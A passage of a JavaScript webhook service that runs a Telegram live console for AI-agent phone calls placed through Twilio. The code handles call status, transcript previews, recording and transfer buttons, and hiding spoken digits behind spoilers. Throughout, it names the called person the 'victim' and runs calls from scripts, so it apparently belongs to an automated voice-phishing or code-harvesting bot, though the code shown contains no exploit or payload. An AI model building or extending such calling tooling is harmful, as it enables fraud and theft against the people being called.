            { text: '🔽 Hide actions', callback_data: `lc:actions:${callSid}` },
            { text: compactLabel, callback_data: `lc:compact:${callSid}` }
          ]
        ]
      };
    }
    return {
      inline_keyboard: [
        [
          { text: '⏺️ Record', callback_data: `lc:rec:${callSid}` },
          { text: '⏹ End', callback_data: `lc:end:${callSid}` },
          { text: '🔀 Transfer', callback_data: `lc:xfer:${callSid}` }
        ],
        [
          { text: compactLabel, callback_data: `lc:compact:${callSid}` }
        ]
      ]
    };
  }

  updateLiveConsoleStatus(callSid, status, chatId, statusSource = null) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return;

    entry.status = this.getConsoleStatusLabel(status, entry.inbound);
    entry.statusKey = status;
    if (statusSource) {
      entry.statusSource = statusSource;
    }
    const statusEvent = this.statusEventText(status, entry.victimName, entry.inbound);
    if (['answered', 'in-progress'].includes(status) && !entry.pickedUpAt) {
      entry.pickedUpAt = new Date();
      entry.phase = this.getConsolePhaseLabel('listening');
      entry.phaseKey = 'listening';
      entry.waveformIndex = 0;
      entry.waveformLevel = 0;
    }
    if (['completed', 'failed', 'no-answer', 'busy', 'canceled', 'voicemail'].includes(status)) {
      entry.phase = this.getConsolePhaseLabel('ended');
      entry.phaseKey = 'ended';
      entry.waveformIndex = 0;
      entry.waveformLevel = 0;
      entry.endedAt = new Date();
    }

    if (statusEvent) {
      this.addLiveEvent(callSid, statusEvent, { force: true });
    }

    this.queueLiveConsoleUpdate(callSid, { force: ['completed', 'failed', 'no-answer', 'busy', 'canceled', 'voicemail'].includes(status) });
  }

  toggleConsoleCompact(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return null;
    entry.compact = !entry.compact;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    return entry.compact;
  }

  toggleConsoleActions(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return null;
    entry.actionsExpanded = !entry.actionsExpanded;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    return entry.actionsExpanded;
  }

  setConsoleCompact(callSid, compact) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return false;
    entry.compact = !!compact;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    return true;
  }

  togglePreviewRedaction(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return null;
    entry.redactPreview = !entry.redactPreview;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    return entry.redactPreview;
  }

  setCallerFlag(callSid, status, note = null) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return false;
    entry.callerFlag = status || null;
    entry.callerNote = note || null;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    return true;
  }

  async setLiveCallPhase(callSid, phaseKey, options = {}) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return;
    this.markCallActivity(callSid);
    const phase = this.getConsolePhaseLabel(phaseKey);
    entry.phase = phase;
    entry.phaseKey = phaseKey;
    const metrics = options.metrics || {};
    if (Number.isFinite(options.latencyMs)) entry.latencyMs = Number(options.latencyMs);
    if (Number.isFinite(metrics.latencyMs)) entry.latencyMs = Number(metrics.latencyMs);
    if (Number.isFinite(options.jitterMs)) entry.jitterMs = Number(options.jitterMs);
    if (Number.isFinite(metrics.jitterMs)) entry.jitterMs = Number(metrics.jitterMs);
    if (Number.isFinite(options.packetLossPct)) entry.packetLossPct = Number(options.packetLossPct);
    if (Number.isFinite(metrics.packetLossPct)) entry.packetLossPct = Number(metrics.packetLossPct);
    if (Number.isFinite(options.asrConfidence)) entry.asrConfidence = Number(options.asrConfidence);
    if (Number.isFinite(metrics.asrConfidence)) entry.asrConfidence = Number(metrics.asrConfidence);
    const frames = this.getWaveformFramesForPhase(phaseKey);
    if (frames && frames.length) {
      const level = this.clampLevel(options.level);
      if (Number.isFinite(level)) {
        const prevLevel = Number.isFinite(entry.lastWaveformLevel) ? entry.lastWaveformLevel : level;
        const delta = Math.abs(level - prevLevel);
        const derivedJitterMs = Math.round(delta * 80);
        if (!Number.isFinite(entry.jitterMs)) {
          entry.jitterMs = derivedJitterMs;
        }
        entry.lastWaveformLevel = level;
      }
      entry.waveformLevel = level ?? entry.waveformLevel ?? 0;
      entry.waveformIndex = Number.isFinite(level)
        ? this.pickWaveformIndex(level, frames)
        : (entry.waveformIndex + 1) % frames.length;
    } else {
      entry.waveformIndex = 0;
      entry.waveformLevel = 0;
    }
    const phaseEvent = this.phaseEventText(phaseKey);
    if (phaseEvent && options.logEvent !== false) {
      this.addLiveEvent(callSid, phaseEvent, { force: !!options.force });
    }
    this.queueLiveConsoleUpdate(callSid, { force: !!options.force });
    return true;
  }

  markToolInvocation(callSid, toolName, options = {}) {
    this.addLiveEvent(callSid, `🔄 Tool: ${toolName || 'unknown'}`, options);
  }

  markSentimentDrop(callSid, options = {}) {
    this.addLiveEvent(callSid, '⚠️ Sentiment drop detected', { force: !!options.force });
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (entry) {
      entry.sentimentFlag = '⚠️';
    }
  }

  addLiveEvent(callSid, eventLine, options = {}) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return;
    this.markCallActivity(callSid);
    const resolved = this.resolveTokenizedText(callSid, String(eventLine || '').trim());
    const line = this.wrapLiveDigitValueWithSpoiler(resolved);
    if (!line) return;
    entry.lastEvents.push(line);
    const maxEvents = Number.isFinite(entry.maxEvents) ? entry.maxEvents : this.liveConsoleMaxEvents;
    if (entry.lastEvents.length > maxEvents) {
      entry.lastEvents.splice(0, entry.lastEvents.length - maxEvents);
    }
    this.queueLiveConsoleUpdate(callSid, { force: !!options.force });
  }

  getLiveConsoleSnapshot(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return null;
    return {
      call_sid: entry.callSid,
      inbound: entry.inbound === true,
      status: entry.statusKey || null,
      status_label: entry.status || null,
      phase: entry.phaseKey || null,
      phase_label: entry.phase || null,
      from: entry.phoneNumber || null,
      to: entry.toNumber || null,
      name: entry.victimName || null,
      script: entry.script || null,
      route_label: entry.routeLabel || null,
      caller_flag: entry.callerFlag || null,
      caller_note: entry.callerNote || null,
      updated_at: entry.lastEditAt ? entry.lastEditAt.toISOString() : null,
      last_events: entry.lastEvents.slice(-3),
      preview: entry.previewTurns || { user: '—', agent: '—' }
    };
  }

  listLiveConsoles() {
    return Array.from(this.liveConsoleByCallSid.keys())
      .map((callSid) => this.getLiveConsoleSnapshot(callSid))
      .filter(Boolean);
  }

  recordTranscriptTurn(callSid, speaker, text) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return;
    const resolved = this.resolveTokenizedText(callSid, text);
    const cleaned = this.truncatePreview(this.normalizePreviewText(resolved));
    if (!cleaned) return;
    this.markCallActivity(callSid);
    this.mediaSeen.set(callSid, true);
    if (speaker === 'user') {
      entry.previewTurns.user = cleaned;
      entry.phase = this.getConsolePhaseLabel('thinking');
      entry.phaseKey = 'thinking';
      entry.waveformIndex = 0;
    } else if (speaker === 'agent') {
      entry.previewTurns.agent = cleaned;
    }
    this.queueLiveConsoleUpdate(callSid);
  }

  queueLiveConsoleUpdate(callSid, options = {}) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry || !entry.messageId) return;
    const force = !!options.force;
    const now = Date.now();
    const lastEdit = entry.lastEditAt ? entry.lastEditAt.getTime() : 0;
    const elapsed = now - lastEdit;

    if (force || elapsed >= this.liveConsoleDebounceMs) {
      this.editLiveConsoleMessage(callSid).catch(() => {});
      return;
    }

    if (this.liveConsoleEditTimers.has(callSid)) return;
    const delay = Math.max(this.liveConsoleDebounceMs - elapsed, 0);
    const timer = setTimeout(() => {
      this.liveConsoleEditTimers.delete(callSid);
      this.editLiveConsoleMessage(callSid).catch(() => {});
    }, delay);
    this.liveConsoleEditTimers.set(callSid, timer);
  }

  async editLiveConsoleMessage(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry || !entry.messageId) return;
    entry.lastEditAt = new Date();
    const text = this.buildLiveConsoleMessage(entry);
    const escapedText = this.escapeMarkdownV2PreservingSpoilers(text);
    const markup = this.consoleButtons(callSid, entry);
    const markupKey = JSON.stringify(markup || {});
    if (text === entry.lastMessageText && markupKey === entry.lastMarkup) {
      return;
    }
    try {
      await this.editTelegramMessage(entry.chatId, entry.messageId, escapedText, false, markup, {
        parseMode: 'MarkdownV2'
      });
      entry.lastMessageText = text;
      entry.lastMarkup = markupKey;
    } catch (error) {
      const telegramError = error?.response?.data?.description || error.message;
      if (telegramError && telegramError.includes('message is not modified')) {
        entry.lastMessageText = text;
        entry.lastMarkup = markupKey;
        return;
      }
      console.error(`❌ Live console edit failed (callSid=${callSid}, messageId=${entry.messageId}): ${telegramError}`);
      // No noisy notifications; rely on next successful update
    }
  }

  redactPreviewText(text) {
    if (!text) return text;
    let redacted = String(text);
    redacted = redacted.replace(/\b\d{4,}\b/g, '••••');
    redacted = redacted.replace(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, '••@••');
    return redacted;
  }

  applyPreviewRedaction(entry, text) {
    if (entry?.redactPreview) {
      return this.redactPreviewText(text);
    }
    return text;
  }

  formatCallerFlagLine(entry) {
    const flag = entry?.callerFlag;
    if (!flag) return null;
    if (flag === 'blocked') return '🚫 Caller blocked';
    if (flag === 'allowed') return '✅ Caller allowlisted';
    if (flag === 'spam') return '⚠️ Marked spam';
    return `📛 Caller flag: ${flag}`;
  }

  formatInboundTimingLine(entry, phaseDisplay) {
    const waitElapsed = this.formatElapsed(entry.createdAt, entry.pickedUpAt || entry.endedAt);
    if (entry.pickedUpAt) {
      const talkElapsed = this.formatElapsed(entry.pickedUpAt, entry.endedAt);
      return `⏱ Answered in ${waitElapsed} | Talk ${talkElapsed} | Phase: ${phaseDisplay}`;
    }
    return `⏱ Waiting ${waitElapsed} | Phase: ${phaseDisplay}`;
  }

  buildLiveConsoleMessage(entry) {
    const elapsed = this.formatElapsed(entry.createdAt, entry.endedAt);
    const timeline = this.formatEventTimeline(entry.lastEvents, entry?.maxEvents);
    const phaseKey = entry.phaseKey || '';
    const frames = this.getWaveformFramesForPhase(phaseKey);
    let phaseLine = entry.phase;
    if (frames && frames.length) {
      const frame = frames[entry.waveformIndex % frames.length] || frames[0];
      phaseLine = `${entry.phase} ${frame}`;
    }
    const phaseAccent = this.getPhaseAccent(phaseKey);
    const phaseDisplay = `${phaseAccent} ${phaseLine}`;
    const sentimentLine = entry.sentimentFlag ? `Mood: ${entry.sentimentFlag}` : null;
    const recentBlock = timeline.join('\n');
    const signalLine = this.buildSignalLine(entry);
    const latencyLine = this.formatLatencyLine(entry);
    const healthLine = this.formatHealthLine(entry);
    const activityTs = entry.callSid ? this.callActivityAt.get(entry.callSid) : null;
    const updatedAt = activityTs ? new Date(activityTs) : entry.lastEditAt;
    const updatedLine = updatedAt ? `🕒 Updated ${updatedAt.toLocaleTimeString()}` : null;
    const headerLine = entry.inbound
      ? `${signalLine} | 📥 Incoming • ${stripStatusEmoji(entry.status)}`
      : `🎧 Live Call • ${entry.status}`;
    const gateStatus = entry.inbound ? this.getInboundGate(entry.callSid)?.status : null;
    const gatePending = !gateStatus || gateStatus === 'pending';
    const gateLine = entry.inbound && gatePending && !this.isTerminalStatus(entry.statusKey)
      ? '⏳ Awaiting admin decision'
      : null;
    const flagLine = entry.inbound ? this.formatCallerFlagLine(entry) : null;
    const previewUser = this.applyPreviewRedaction(entry, entry.previewTurns.user || '—');
    const previewAgent = this.applyPreviewRedaction(entry, entry.previewTurns.agent || '—');
    const maskedFrom = maskPhoneLast4(entry.phoneNumber);
    const fromLine = entry.inbound
      ? (entry.victimName && entry.victimName !== 'Unknown'
        ? `📲 From: ${entry.victimName} • ${maskedFrom}`
        : `📲 From: ${maskedFrom}`)
      : `👤 ${entry.victimName} | 📞 ${entry.phoneNumber}`;

    if (entry.compact) {
      if (entry.inbound) {
        const waitingElapsed = this.formatElapsed(entry.createdAt, entry.pickedUpAt || entry.endedAt);
        const durationElapsed = entry.pickedUpAt ? this.formatElapsed(entry.pickedUpAt, entry.endedAt) : null;
        const timingLine = entry.pickedUpAt
          ? `⏱ Duration ${durationElapsed}`
          : `⏱ Waiting ${waitingElapsed}`;
        const recentLines = timeline.length && !(timeline.length === 1 && timeline[0].includes('—'))
          ? ['Recent', recentBlock]
          : [];
        return [
          headerLine,
          gateLine,
          updatedLine,
          fromLine,
          `📍 Phase: ${phaseDisplay}`,
          timingLine,
          healthLine,
          flagLine,
          ...recentLines
        ].filter(Boolean).join('\n');
      }
      return [
        signalLine,
        headerLine,
        updatedLine,
        fromLine,
        entry.script && entry.script !== '—' ? `🧩 ${entry.script}` : null,
        `⏱ ${elapsed} | Phase: ${phaseDisplay}`,
        `${latencyLine} | ${healthLine}`,
        'Highlights',
        recentBlock,
        'Preview',
        `🧑 ${previewUser}`,
        `🤖 ${previewAgent}`
      ].filter(Boolean).join('\n');
    }

    if (entry.inbound) {
      const routeLine = entry.routeLabel
        ? `🧭 Route: ${entry.routeLabel}`
        : (entry.script && entry.script !== '—' ? `🧩 Script: ${entry.script}` : null);
      const scriptLine = entry.routeLabel && entry.script && entry.script !== '—' && entry.script !== entry.routeLabel
        ? `🧩 Script: ${entry.script}`
        : null;
      const toLine = entry.toNumber && entry.toNumber !== 'Unknown' ? `📍 To: ${entry.toNumber}` : null;
      const timingLine = this.formatInboundTimingLine(entry, phaseDisplay);
      return [
        headerLine,
        gateLine,
        updatedLine,
        fromLine,
        toLine,
        routeLine,
        scriptLine,
        timingLine,
        latencyLine,
        healthLine,
        flagLine,
        sentimentLine,
        '',
        'Highlights',
        recentBlock,
        '',
        'Preview',
        `🧑 ${previewUser}`,
        `🤖 ${previewAgent}`
      ].filter(Boolean).join('\n');
    }

    return [
      signalLine,
      headerLine,
      updatedLine,
      fromLine,
      entry.script && entry.script !== '—' ? `🧩 ${entry.script}` : null,
      `⏱ ${elapsed} | Phase: ${phaseDisplay}`,
      latencyLine,
      healthLine,
      sentimentLine,
      '',
      'Highlights',
      recentBlock,
      '',
      'Preview',
      `🧑 ${previewUser}`,
      `🤖 ${previewAgent}`
    ].filter(Boolean).join('\n');
  }

  buildProgressTrackerInline(statusLabel) {
    const normalized = String(statusLabel || '').toLowerCase();
    const stages = ['📡', '🔔', '📞', '☎️', '✅'];
    const indexMap = {
      '📡 initiated': 0,
      '🔔 ringing…': 1,
      '📞 picked up': 2,
      '☎️ in progress': 3,
      '✅ completed': 4
    };
    const activeIndex = indexMap[normalized] ?? 0;
    return stages.map((s, i) => (i <= activeIndex ? `*${s}*` : s)).join(' ─ ');
  }

  formatDuration(totalSeconds) {
    if (!totalSeconds && totalSeconds !== 0) return '';
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    return `${minutes}:${String(seconds).padStart(2, '0')}`;
  }

  formatElapsed(startTime, endTime = null) {
    if (!startTime) return '00:00';
    const end = endTime || new Date();
    const diffMs = Math.max(0, end - startTime);
    const totalSeconds = Math.floor(diffMs / 1000);
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    return `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
  }

  truncatePreview(text) {
    if (!text) return '';
    if (text.length <= this.liveConsoleMaxPreviewChars) return text;
    return text.slice(0, this.liveConsoleMaxPreviewChars - 1).trim() + '…';
  }

  normalizePreviewText(text) {
    return String(text || '').replace(/\s+/g, ' ').trim();
  }

  statusEventText(status, victimName, inbound = false) {
    const name = victimName || 'victim';
    const map = {
      initiated: `📡 Connecting to ${name}…`,
      ringing: inbound ? `🔔 Incoming call from ${name}…` : `🔔 Ringing ${name}…`,
      answered: `📞 ${name} picked up`,
      'in-progress': `☎️ Connected`,
      completed: `🟢 Call ended`,
      voicemail: `📮 Voicemail detected`,
      'no-answer': `⏳ ${name} didn't pick up`,
      busy: `🚫 ${name}'s line is busy`,
      failed: `❌ Call failed`,
      canceled: `⚠️ Call canceled`
    };
    return map[status] || null;
  }

  phaseEventText(phaseKey) {
    const map = {
      user_speaking: '🎙 User speaking…',
      agent_responding: '🤖 Agent responding…',
      agent_speaking: '🔊 Agent speaking…',
      interrupted: '✋ Interrupted'
    };
    return map[phaseKey] || null;
  }

  markSentimentScore(callSid, score) {
    const now = Date.now();
    const last = this.lastSentimentAt.get(callSid) || 0;
    if (now - last < this.sentimentCooldownMs) {
      return;
    }
    if (typeof score === 'number' && score < -0.3) {
      this.markSentimentDrop(callSid, { force: true });
      this.lastSentimentAt.set(callSid, now);
    }
  }

  lockConsoleButtons(callSid, label = 'Working…', durationMs = 1500) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return;
    entry.actionLock = label;
    this.queueLiveConsoleUpdate(callSid, { force: true });
    setTimeout(() => {
      this.unlockConsoleButtons(callSid);
    }, durationMs);
  }

  unlockConsoleButtons(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry || !entry.actionLock) return;
    entry.actionLock = null;
    this.queueLiveConsoleUpdate(callSid, { force: true });
  }
  correctStatusForEvidence(normalizedStatus, context) {
    const { callTiming, callDetails, statusInfo, additionalData } = context || {};
    const history = statusInfo?.statusHistory || [];
    const mediaEvidence = this.mediaSeen.get(context?.callSid) || false;
    const persistedStatus = String(callDetails?.status || callDetails?.twilio_status || '').toLowerCase();
    const voicemailDetected = this.isVoicemailAnswer(additionalData?.answered_by)
      || additionalData?.voicemail_detected === true;
    const durationEvidence = Number.isFinite(Number(callDetails?.duration)) && Number(callDetails?.duration) > 0;
    const answeredEvidence = !!(
      callTiming?.answered ||
      callDetails?.started_at ||
      history.includes('answered') ||
      history.includes('in-progress') ||
      mediaEvidence ||
      ['answered', 'in-progress', 'completed'].includes(persistedStatus) ||
      durationEvidence
    );

    if (normalizedStatus === 'in-progress' && !answeredEvidence) {
      return 'ringing';
    }

    if (voicemailDetected) {
      if (['answered', 'in-progress', 'completed', 'no-answer', 'no_answer'].includes(normalizedStatus)) {
        return 'no-answer';
      }
    }

    if ((normalizedStatus === 'no-answer' || normalizedStatus === 'no_answer') && answeredEvidence) {
      return 'completed';
    }

    if (normalizedStatus === 'completed') {
      const duration = typeof additionalData.duration === 'number' ? additionalData.duration : null;
      const durationConfirmed = typeof duration === 'number' && duration > 0;
      const noAnsweredHistory = !answeredEvidence && !history.includes('completed');
      if ((!answeredEvidence && !durationConfirmed) || noAnsweredHistory) {
        return 'no-answer';
      }
    }

    return normalizedStatus;
  }

  buildTranscriptPreview(transcripts, maxLines) {
    const preview = transcripts.slice(-maxLines);
    return preview.map((entry) => {
      const speaker = entry.speaker === 'user' ? '🧑 User' : '🤖 AI';
      const cleanMessage = this.cleanMessageForTelegram(entry.message);
      const snippet = this.truncateText(cleanMessage, 180);
      return `${speaker}: ${snippet}`;
    });
  }

  generateAutoSummaryFromTranscripts(transcripts) {
    if (!Array.isArray(transcripts) || transcripts.length === 0) {
      return '';
    }
    const firstUser = transcripts.find((entry) => entry.speaker === 'user');
    const lastAi = [...transcripts].reverse().find((entry) => entry.speaker === 'ai');
    const parts = [];
    if (firstUser?.message) {
      const text = firstUser.message.replace(/\s+/g, ' ');
      parts.push(`Victim mentioned ${this.truncateText(text, 120)}`);
    }
    if (lastAi?.message) {
      const text = lastAi.message.replace(/\s+/g, ' ');
      parts.push(`AI responded ${this.truncateText(text, 120)}`);
    }
    return parts.join('. ');
  }

  polishSummaryText(text) {
    if (!text) return '';
    let sanitized = String(text)
      .replace(/[•–—-]/g, ' ')
      .replace(/[*_`\[\]()~>#+=|{}]/g, '')
      .replace(/\s+/g, ' ')
      .trim();
    if (!sanitized) return '';
    if (!/[.!?]$/.test(sanitized)) {
      sanitized += '.';
    }
    return sanitized;
  }

  truncateText(text, maxLength) {
    if (!text) return '';
    if (text.length <= maxLength) return text;
    return `${text.slice(0, maxLength - 3)}...`;
  }

  splitMessage(message, maxLength) {
    const chunks = [];
    let currentChunk = '';
    const lines = message.split('\n');
    
    for (const line of lines) {
      if ((currentChunk + line + '\n').length > maxLength) {
        if (currentChunk) {
          chunks.push(currentChunk.trim());
          currentChunk = '';
        }
        
        // If a single line is too long, split it
        if (line.length > maxLength) {
          let remainingLine = line;
          while (remainingLine.length > maxLength) {
            let splitIndex = remainingLine.lastIndexOf(' ', maxLength);
            if (splitIndex === -1) splitIndex = maxLength;
            
            chunks.push(remainingLine.substring(0, splitIndex));
            remainingLine = remainingLine.substring(splitIndex).trim();
          }
          if (remainingLine) {
            currentChunk = remainingLine + '\n';
          }
        } else {
          currentChunk = line + '\n';
        }
      } else {
        currentChunk += line + '\n';
      }
    }
    
    if (currentChunk.trim()) {
      chunks.push(currentChunk.trim());
    }
    
    return chunks;
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Clean up old call data to prevent memory leaks
  cleanupOldCallData() {
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    const callsToCleanup = [];

    for (const [callSid, statusInfo] of this.activeCallStatus.entries()) {
      if (statusInfo.timestamp < oneHourAgo) {
        callsToCleanup.push(callSid);
      }
    }

    for (const callSid of callsToCleanup) {
      this.cleanupCallData(callSid);
    }

    if (callsToCleanup.length > 0) {
      console.log(`🧹 Cleaned up ${callsToCleanup.length} old call records`);
    }
  }

  cleanupCallData(callSid) {
    this.activeCallStatus.delete(callSid);
    this.callTimestamps.delete(callSid);
    this.liveConsoleByCallSid.delete(callSid);
    const timer = this.liveConsoleEditTimers.get(callSid);
    if (timer) {
      clearTimeout(timer);
      this.liveConsoleEditTimers.delete(callSid);
    }
    this.lastSentimentAt.delete(callSid);
    this.mediaSeen.delete(callSid);
    this.callActivityAt.delete(callSid);
    this.inboundGate.delete(callSid);
    this.pendingTerminalStatus.delete(callSid);
    const pendingTimer = this.pendingTerminalTimers.get(callSid);
    if (pendingTimer) {
      clearTimeout(pendingTimer);
      this.pendingTerminalTimers.delete(callSid);
    }
    this.pendingTranscriptNotifs.delete(callSid);
    const transcriptTimer = this.pendingTranscriptTimers.get(callSid);
    if (transcriptTimer) {
      clearTimeout(transcriptTimer);
      this.pendingTranscriptTimers.delete(callSid);
    }
    this.terminalStatusSent.delete(callSid);
  }

  async deferTranscriptIfNeeded(notification) {
    const { id, call_sid, telegram_chat_id } = notification;
    if (this.isTerminalMessageSent(call_sid)) {
      const sent = await this.sendCallTranscript(call_sid, telegram_chat_id);
      return { ok: sent, deferred: false };
    }

    if (!this.pendingTranscriptNotifs.has(call_sid)) {
      this.pendingTranscriptNotifs.set(call_sid, {
        id,
        telegram_chat_id,
        createdAt: Date.now(),
        attempts: 0
      });
    }
    this.scheduleTranscriptRetry(call_sid);
    console.log(`⏳ Deferring transcript for ${call_sid} until call ends`);
    return { ok: true, deferred: true };
  }

  scheduleTranscriptRetry(callSid) {
    if (this.pendingTranscriptTimers.has(callSid)) return;
    const timer = setTimeout(() => {
      this.pendingTranscriptTimers.delete(callSid);
      this.flushPendingTranscript(callSid).catch(() => {});
    }, this.transcriptRetryMs);
    this.pendingTranscriptTimers.set(callSid, timer);
  }

  async flushPendingTranscript(callSid) {
    const pending = this.pendingTranscriptNotifs.get(callSid);
    if (!pending) return;
    const isTerminalSent = this.isTerminalMessageSent(callSid);
    pending.attempts += 1;
    const ageMs = Date.now() - pending.createdAt;

    if (!isTerminalSent && ageMs < this.transcriptMaxWaitMs) {
      this.pendingTranscriptNotifs.set(callSid, pending);
      this.scheduleTranscriptRetry(callSid);
      return;
    }

    if (!isTerminalSent) {
      await this.db.updateEnhancedWebhookNotification(pending.id, 'failed', 'Transcript waiting for terminal status', null);
      this.pendingTranscriptNotifs.delete(callSid);
      return;
    }

    const sent = await this.sendCallTranscript(callSid, pending.telegram_chat_id);
    if (sent) {
      await this.db.updateEnhancedWebhookNotification(pending.id, 'sent', null, null);
      this.pendingTranscriptNotifs.delete(callSid);
    } else {
      if (ageMs < this.transcriptMaxWaitMs) {
        this.pendingTranscriptNotifs.set(callSid, pending);
        this.scheduleTranscriptRetry(callSid);
      } else {
        await this.db.updateEnhancedWebhookNotification(pending.id, 'failed', 'Transcript deferred too long', null);
        this.pendingTranscriptNotifs.delete(callSid);
      }
    }
  }

  // Enhanced immediate status update with better error handling
  async sendImmediateStatus(call_sid, status, telegram_chat_id) {
    try {
      return await this.sendCallStatusUpdate(call_sid, status, telegram_chat_id, { status_source: 'manual' });
    } catch (error) {
      console.error(`❌ Failed to send immediate status for ${call_sid}:`, error);
      // Try to send a generic notification
      try {
        await this.sendTelegramMessage(telegram_chat_id, `📱 Call ${call_sid.slice(-6)} status: ${status}`);
        return true;
      } catch (fallbackError) {
        console.error(`❌ Fallback notification also failed:`, fallbackError);
        return false;
      }
    }
  }

  // Enhanced health check
  async healthCheck() {
    if (!this.telegramBotToken) {
      return { status: 'disabled', reason: 'No Telegram bot token configured' };
    }

    try {
      const url = `https://api.telegram.org/bot${this.telegramBotToken}/getMe`;
      const response = await axios.get(url, { timeout: 8000 });
      
      if (response.data.ok) {
        return {
          status: 'healthy',
          bot_info: {
            username: response.data.result.username,
            first_name: response.data.result.first_name,
            id: response.data.result.id
          },
          is_running: this.isRunning,
          active_calls: this.activeCallStatus.size,
          tracked_calls: this.callTimestamps.size,
          process_interval: this.processInterval,
          enhanced_features: true
        };
      } else {
        return { status: 'error', reason: 'Telegram API returned error' };
      }
    } catch (error) {
      return { 
        status: 'error', 
        reason: error.message,
        code: error.code || 'UNKNOWN_ERROR'
      };
    }
  }

  // Get call status statistics
  getCallStatusStats() {
    const stats = {
      total_tracked_calls: this.activeCallStatus.size,
      status_breakdown: {},
      average_call_age_minutes: 0,
      enhanced_tracking: true
    };

    let totalAge = 0;
    for (const [callSid, statusInfo] of this.activeCallStatus.entries()) {
      const status = statusInfo.lastStatus;
      stats.status_breakdown[status] = (stats.status_breakdown[status] || 0) + 1;
      
      const ageMinutes = (new Date() - statusInfo.timestamp) / (1000 * 60);
      totalAge += ageMinutes;
    }

    if (this.activeCallStatus.size > 0) {
      stats.average_call_age_minutes = (totalAge / this.activeCallStatus.size).toFixed(1);
    }

    return stats;
  }

  // Method for testing notifications
  async testNotification(call_sid, status, telegram_chat_id) {
    console.log(`🧪 Testing notification: ${status} for call ${call_sid}`.blue);
    
    try {
      const success = await this.sendCallStatusUpdate(call_sid, status, telegram_chat_id);
      console.log(`🧪 Test result: ${success ? 'SUCCESS' : 'FAILED'}`);
      return success;
    } catch (error) {
      console.error(`🧪 Test failed:`, error);
      return false;
    }
  }

  // Get notification performance metrics
  getNotificationMetrics() {
    return {
      service_uptime: this.isRunning,
      process_interval_ms: this.processInterval,
      active_call_tracking: this.activeCallStatus.size,
      call_timestamps_tracked: this.callTimestamps.size,
      telegram_bot_configured: !!this.telegramBotToken,
      enhanced_features_enabled: true
    };
  }
}

// Export singleton instance
const enhancedWebhookService = new EnhancedWebhookService();
module.exports = { webhookService: enhancedWebhookService };
